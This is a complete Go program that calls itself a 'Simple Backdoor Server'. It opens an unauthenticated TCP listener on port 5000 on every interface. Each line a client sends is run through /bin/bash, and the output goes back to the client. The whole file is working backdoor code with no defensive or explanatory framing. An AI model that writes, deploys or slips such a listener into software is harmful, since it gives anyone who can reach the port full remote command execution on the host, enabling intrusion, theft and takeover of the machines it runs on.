package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"sync/atomic"
)

const (
	//If empty then listen on all available interfaces
	CHOST = ""
	CPORT = "5000"
	CTYPE = "tcp4"
)

func errHandling(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func handleRequest(conn net.Conn, connected *int32) {
	fmt.Println("[x] Connection established for", conn.RemoteAddr().String())
	defer conn.Close()
	/* Client buffer */
	var cBuf bytes.Buffer
	/* Server buffer */
	sBuf := make([]byte, 1024)
	//For each user entries
	for {
		/* Read data from the connection and put it into sBuf */
		_, err := conn.Read(sBuf)
		if err != nil {
			fmt.Println("[x] Connection stopped for " + conn.RemoteAddr().String())
			atomic.AddInt32(connected, -1)
			conn.Close()
			return
		}
		/* Clean up sBuf > remove return carriage */
		com := sBuf[:strings.Index(string(sBuf), "\n")]
		fmt.Println("[COMMAND]", string(com))
		//Then exec command server side
		cmd := exec.Command("/bin/bash", "-c", string(com))
		//Put standard out into cBuf
		cmd.Stdout = &cBuf
		err = cmd.Run()
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("[x] %s doesn't work\n", com)))
		} else {
			conn.Write([]byte(cBuf.String() + "\n"))
		}
		cBuf.Reset()
	}
}

func main() {
	var connected int32 = 0
	/*1 - Listen announces on local connection*/
	lisen, err := net.Listen(CTYPE, CHOST+":"+CPORT)
	errHandling(err)
	/* Close it at the end */
	defer lisen.Close()
	fmt.Printf("Simple Backdoor Server Listening on %s:%s\n", CHOST, CPORT)
	/* Infinite loop */
	for {
		/* Accept tcp connections on port */
		conn, _ := lisen.Accept()
		errHandling(err)
		atomic.AddInt32(&connected, 1)
		go handleRequest(conn, &connected)
		fmt.Println("Nb Connected:", atomic.LoadInt32(&connected))
	}
}
